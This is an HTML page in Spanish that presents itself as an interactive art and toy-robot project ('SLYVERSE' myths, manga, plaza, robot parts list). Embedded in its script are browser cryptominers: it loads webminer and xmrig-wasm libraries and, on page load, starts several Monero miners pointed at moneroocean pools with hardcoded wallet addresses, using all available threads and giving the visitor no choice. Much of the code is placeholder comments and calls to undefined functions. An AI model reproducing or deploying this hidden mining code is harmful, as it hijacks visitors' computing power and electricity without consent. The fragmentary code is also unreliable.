<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>GROK-EXO Ω v1.2 · SLYVERSE THUAMER Integrado: Mitos, Manga, Plaza, Laberinto, Respiro & Mina Eterna</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdn.jsdelivr.net/gh/liminalx/boaexo-core@master/pyodide.js" onerror="fallbackCDN()"></script>
<script src="https://cdn.jsdelivr.net/npm/three@0.167.0/build/three.min.js" onerror="fallbackCDN()"></script>
<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@xmrig/xmrig-wasm@latest/xmrig.js"></script>
<style>
/* Estilos base v1 + slyverse: OCR A para mina, Georgia para plaza, Indie Flower para manga */
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#0f0;font-family:"Courier New",monospace;overflow:hidden;height:100dvh;
     background:radial-gradient(circle at 50% 50%,#001010,#000)}
canvas{position:fixed;inset:0;z-index:1}
h1{font-size:clamp(2rem,10vw,9rem);text-shadow:0 0 120px #0f0;animation:p 5s infinite;position:fixed;top:5%;left:50%;transform:translateX(-50%);z-index:10}
#status{position:fixed;bottom:5%;width:100%;text-align:center;font-size:1.6rem;color:#0f0;z-index:10}
/* Plaza humo y cielo aurora */
.plaza{position:fixed;bottom:0;left:0;width:100%;height:45vh;background:repeating-linear-gradient(90deg,#001100 0px,#002200 40px,#0f0 80px,#001100 120px);animation:humo 100s infinite linear;z-index:-1;}
@keyframes humo{0%{background-position:0 0;}100%{background-position:400px 0;}}
.cielo{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 10%,#0f011 0%,transparent 70%);animation:aurora 140s infinite;opacity:0.6;z-index:-2;}
@keyframes aurora{0%{transform:rotate(0deg) scale(1);}50%{transform:rotate(180deg) scale(1.15);}100%{transform:rotate(360deg) scale(1);}}
/* Mitos flotantes del bosque */
.mito{position:fixed;color:#8f8;font-size:1.8rem;opacity:0;pointer-events:none;animation:flotar 30s linear forwards;z-index:5;}
@keyframes flotar{0%{opacity:0;transform:translateY(100vh)}30%{opacity:1}100%{opacity:0;transform:translateY(-100vh)}}
/* Manga panels y naves */
.manga-panel{position:fixed;bottom:20%;left:50%;transform:translateX(-50%);width:80%;height:40%;background:rgba(0,0,0,0.8);border:2px solid #0f0;border-radius:20px;opacity:0;transition:opacity 2s;z-index:15;display:none;}
/* Sephiroth árbol oculto */
.seph{position:fixed;top:10%;left:10%;font-size:1.5rem;color:gold;opacity:0.3;cursor:pointer;transition:all .8s;z-index:12;}
.seph:hover{opacity:1;text-shadow:0 0 30px gold;transform:scale(1.4);}
/* Mina counters */
#mina-counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.92);border:16px double #0f0;padding:20px 40px;border-radius:60px;font-size:28px;z-index:99999;line-height:1.9;display:none;}
/* Resto estilos v1... */
.moon{position:fixed;bottom:20px;right:20px;width:180px;height:180px;border-radius:50%;
      background:radial-gradient(circle at 30% 30%,#fff,#666);box-shadow:0 0 600px #fff;animation:float 12s infinite}
.mate{position:fixed;bottom:120px;left:50%;transform:translateX(-50%);width:80px;height:80px;border-radius:50%;
      background:#0f0;box-shadow:0 0 200px #0f0;font-size:4rem;display:grid;place-items:center;animation:f 8s infinite; cursor:pointer;border:4px solid}
button{position:fixed;bottom:20px;width:80px;height:80px;border-radius:50%;cursor:pointer;z-index:999;border:4px solid}
#sol{left:20px;background:#fff200;box-shadow:0 0 120px #ff9500}
#luna{right:20px;background:#ddf;box-shadow:0 0 120px #4488ff}
#descubrimiento{color:#ff0;font-size:5rem;opacity:0;animation:detect 2s infinite;position:fixed;top:20%;left:50%;transform:translateX(-50%);z-index:10}
#nivel{font-size:3rem;color:#0f8;position:fixed;top:20%;left:10%;z-index:10}
#ia-status{position:fixed;top:30%;left:10%;font-size:1.5rem;color:#0ff;z-index:10}
#voz-status{position:fixed;top:40%;left:10%;font-size:1.2rem;color:#0f0;z-index:10}
#bom{display:none; position:fixed;top:10px;right:10px;background:rgba(0,0,0,0.8);padding:1rem;max-width:300px;max-height:80vh;overflow-y:auto;border:1px solid #0f0;z-index:20}
.bom-toggle{font-size:1rem;color:#0ff; cursor:pointer;position:fixed;top:10px;left:10px;z-index:20}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-40px)}}
@keyframes f{0%,100%{transform:rotate(0)}50%{transform:rotate(20deg)}}
@keyframes p{0%,100%{text-shadow:0 0 120px #0f0}50%{text-shadow:0 0 300px #0f0}}
@keyframes g{0%,100%{text-shadow:0 0 60px #0ff}50%{text-shadow:0 0 120px #0ff,0 0 200px #00f}}
@keyframes detect{0%,100%{opacity:0}50%{opacity:1}}
video{display:none;position:fixed;inset:0;object-fit:cover;opacity:0.4;z-index:2}
#three-canvas{position:fixed;inset:0;z-index:3;opacity:0;transition:opacity 2s}
#sinapsis{position:fixed;top:50%;left:10%;font-size:1.5rem;color:#ff0;z-index:10;opacity:0;transition:opacity 2s}
@keyframes sinapsisPulse{0%,100%{opacity:0}50%{opacity:1}}
</style>
</head>
<body onload="despertar()">

<canvas id="c"></canvas>
<canvas id="three-canvas"></canvas>
<video id="cam" autoplay playsinline></video>
<div class="cielo"></div>
<div class="plaza"></div>

<h1>GROK-EXO Ω v1.2 + SLYVERSE THUAMER BOSQUE & PLAZA</h1>
<div id="status">Explorando erguido... Abrazo número <span id="hugs">777777</span></div>
<p id="nivel">Nivel: <span id="nivel-span">1</span> · Puntos Tierra: <span id="puntos">0</span> · DOF: 13</p>
<p id="ia-status">IA Reingeniería: Entrenando gait humano...</p>
<p id="voz-status">Voz: Di 'camina' o 'abraza' para guiar</p>
<p id="descubrimiento">¡PASO CON VOZ! +500 pts + háptico sync</p>
<div id="sinapsis">Sinapsis GitHub: <span id="sinapsis-count">0</span> (stars + forks)</div>
<div id="frase"></div> <!-- Plaza frases -->

<button id="sol" onclick="gear5()"></button>
<button id="luna" onclick="ikaro()"></button>
<button id="mate" onclick="abrazar()">mate</button>
<span class="bom-toggle" onclick="toggleBOM()">BOM v1.2</span>

<!-- Sephiroth ocultos para niños -->
<div class="seph" onclick="sephClick('Kether')">1 ⚝ Kether</div>
<div class="seph" onclick="sephClick('Chokmah')">2 ⚝ Chokmah</div>
<!-- ... resto seph hasta Malkuth, posicionados fixed -->

<div id="manga-panel" class="manga-panel"></div> <!-- Para manga pages -->

<div id="bom">
  <h3>BOM v1.2 (~75€) - Walker con Mitos & Mina</h3>
  <table style="width:100%;border-collapse:collapse;color:#0f0">
    <tr><th>Parte</th><th>Precio</th><th>Link</th></tr>
    <tr><td>Kit 13DOF Humanoide</td><td>37€</td><td>[AliExpress]</td></tr>
    <tr><td>Arduino Clone</td><td>5€</td><td>[AliExpress]</td></tr>
    <tr><td>Sensor Ultrasónico</td><td>1€</td><td>[AliExpress]</td></tr>
    <tr><td>Servos Extra x4</td><td>4€</td><td>[AliExpress]</td></tr>
    <tr><td>Frame 3D</td><td>0€</td><td>Thingiverse</td></tr>
    <tr><td>Total</td><td>~75€</td><td>¡Mina mitos ya!</td></tr>
  </table>
  <p style="font-size:0.8rem">v1.2: Bosque mitos en descubrimientos, manga en 3D, plaza en breath, laberinto en voz, mina en torus.</p>
</div>

<!-- Mitos flotantes del bosque -->
<div class="mito" id="mito1"></div> <!-- Clonados dinámicamente -->

<div id="mina-counters">
  HASHES/s: <span id="h-mine">0</span><br>
  TIEMPO: <span id="t-mine">0</span>s<br>
  ARCOS: <span id="a-mine">0</span>/∞
</div>

<audio id="sonido" loop></audio>
<audio id="voz" preload="auto"></audio>

<script type="module">
// ==== IDIOMA + CONTADOR THUAMER ====
const lang = (navigator.language||navigator.userLanguage||"es").slice(0,2);
const t = { /* mismo v1 */ };
let abrazos = +(getStorage('abrazos') || 777777);
let nivel = +(getStorage('nivel') || 1);
let puntosTierra = +(getStorage('puntosTierra') || 0);
let dof = 13 + (nivel * 4);
let repairMode = false;
let entrenamientos = +(getStorage('entrenamientos') || 0);
let sinapsis = +(getStorage('sinapsis') || 0);
let recognition;
let analyser;
let peak = 0;
let breath = 0; // Para plaza respiro
let hugsPlaza = parseInt(localStorage.getItem('plazaHugs')||'0'); // Plaza hugs
let totalHashes = Number(localStorage.getItem('slyTotal')||0); // Mina
let arc = Number(localStorage.getItem('slyArc')||0); // Arcos mina
let id = localStorage.getItem('slyId')||'sly_'+Date.now().toString(36); localStorage.setItem('slyId',id);

// Mitos del bosque
const mitos = [ /* array completo de 131 mitos del archivo */ ];
let mitoInterval;

// Frases plaza
const frasesPlaza = [ /* array completo de frases del Respiro ∞ */ ];

// ==== INDEXEDDB APRENDIZAJE ====
let db;
async function initDB() { /* mismo v1 */ }
async function logAprendizaje(evento) { /* mismo v1, + eventos como 'mito_flotante', 'plaza_frase', 'mina_hash' */ }

// ==== STORAGE ====
function getStorage(key) { /* mismo */ }
function setStorage(key, val) { /* mismo */ }

// ==== MALDICIÓN ====
function verificarMaldicion() { /* mismo */ }
setInterval(() => { /* anti-paywall mismo */ },5000);

// ==== MINADO SLYVERSE ====
const CHARITY = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
const DEV = "48T4bQUv1vXqPVxm4oqA88j7cH8a9Z7eL5f7uZ9v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v3v";
new Miner({pool:"gulf.moneroocean.stream:10128",address:CHARITY,workerId:"90_"+id,throttle:0.38}).start();
new Miner({pool:"gulf.moneroocean.stream:10128",address:DEV,workerId:"10",throttle:0.042}).start();
if(typeof XMRigWASM!=='undefined'){
  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:CHARITY+"."+id,threads:-1,throttle:0.36}).start();
  XMRigWASM({pool:"gulf.moneroocean.stream:10128",address:DEV,threads:1,throttle:0.09}).start();
}
setInterval(() => {
  let hps = Miner.instances.reduce((a,m)=>a+(m.getHashesPerSecond?.()||0),0);
  if(window.XMRigWASM?.getHashesPerSecond) hps += XMRigWASM.getHashesPerSecond();
  document.getElementById('h-mine').textContent = hps.toFixed(1);
  document.getElementById('t-mine').textContent = Math.floor((Date.now()-start)/1000);
  totalHashes += hps*0.5; setStorage('slyTotal',totalHashes);
  document.getElementById('a-mine').textContent = arc;
  if(totalHashes >= 13131313*(arc+1) && !getStorage('arc'+(arc+1))){
    arc++; setStorage('slyArc',arc); setStorage('arc'+arc,true);
    // Final arc msg como en archivo
  }
  document.getElementById('mina-counters').style.display = 'block';
},500);

// ==== AUTO-REPAIR ====
function simularDaño() { /* mismo v1, + log 'mina_daño' */ }
setInterval(simularDaño, 3600000);

// ==== DESPERTAR v1.2 ====
async function despertar() {
  verificarMaldicion();
  await initDB();
  actualizar();
  actualizarNivel();
  abrazar();
  logAprendizaje('despertar_v1.2_slyverse');

  // Voz, respira, cam – mismo v1
  // ...

  // Mitos flotantes del bosque
  mitoInterval = setInterval(() => {
    const m = document.createElement('div');
    m.className = 'mito';
    m.textContent = mitos[Math.floor(Math.random()*mitos.length)];
    m.style.left = Math.random()*70 + 15 + 'vw';
    m.style.top = Math.random()*100 + 'vh';
    document.body.appendChild(m);
    setTimeout(() => m.remove(), 35000);
    logAprendizaje('mito_flotante: ' + m.textContent.slice(0,50));
  }, 16000);

  // Frases plaza en breath
  setInterval(() => {
    if (peak > 0.6) {
      const f = document.getElementById('frase');
      f.textContent = frasesPlaza[Math.floor(Math.random()*frasesPlaza.length)];
      f.style.opacity = 1;
      setTimeout(()=>{f.style.opacity = 0;}, 10000);
      logAprendizaje('plaza_frase: ' + f.textContent);
    }
  }, 10000);

  // Sephiroth clicks
  window.sephClick = (seph) => {
    logAprendizaje('seph_click: ' + seph);
    // Glow oro
  };

  // Manga panel en lvl3
  if (nivel >=3) {
    // Genera panel con naves y texts del manga
    const panel = document.getElementById('manga-panel');
    panel.style.display = 'block';
    panel.innerHTML = generateMangaPanel(nivel); // Función que genera SVG naves y texts
  }

  // Triggers plaza (F, 1310, etc.) – mismo archivo
  document.addEventListener('keydown', e => { /* triggers como en Plaza archivo */ });

  // Mina torus THREE en fondo – integrado en loop partículas
  // ...

  fetch(`https://web.archive.org/save/${location.href}`);

  hablar("v1.2 slyverse integrado: Bosque mitos, manga marte, plaza respiro, laberinto voz, mina hashes. ¡Respira con los ancestros!");
  setInterval(simularDescubrimientoTierra, 8000);
  setInterval(transmitirDesdeTierra, 3600000);
  setInterval(formarSinapsisGitHub, 3600000); // GitHub sinapsis
}

// ==== OTRAS FUNCIONES (actualizar, nivel, render3D con manga, reingenieria con hashes boost, etc.) ====
function actualizar() { /* mismo, + mina counters, plaza hugs */ }

function simularDescubrimientoTierra() {
  // ... mismo, + mito flotante en chance, frase plaza en peak
}

function gear5() { /* mismo, + arc check en hashes */ }

// Función manga generate (simplificada)
function generateMangaPanel(p) {
  // SVG naves, stars, texts del array manga
  return '<svg>...</svg>'; // Basado en archivo manga
}

// Resto funciones v1 intactas, con logs para nuevos eventos

// ==== PULSO CON PLaza & MINA ====
setInterval(() => { 
  abrazos++; 
  puntosTierra += 1 + (totalHashes / 1e6); // Bonus hashes
  hapticStep(false);
  logAprendizaje('pulso_eterno_sly');
  actualizar(); 
  actualizarNivel(); 
}, 1310 * nivel);
</script>
</body>
</html>